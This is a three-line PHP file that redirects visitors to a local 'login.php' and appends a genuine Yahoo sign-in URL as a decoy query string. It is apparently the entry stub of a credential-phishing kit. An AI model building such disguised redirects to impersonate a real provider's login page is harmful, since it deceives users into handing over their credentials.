<?php
header ('Location: login.php?https://login.yahoo.com/?.src=ym&.intl=us&.lang=en-US');


?>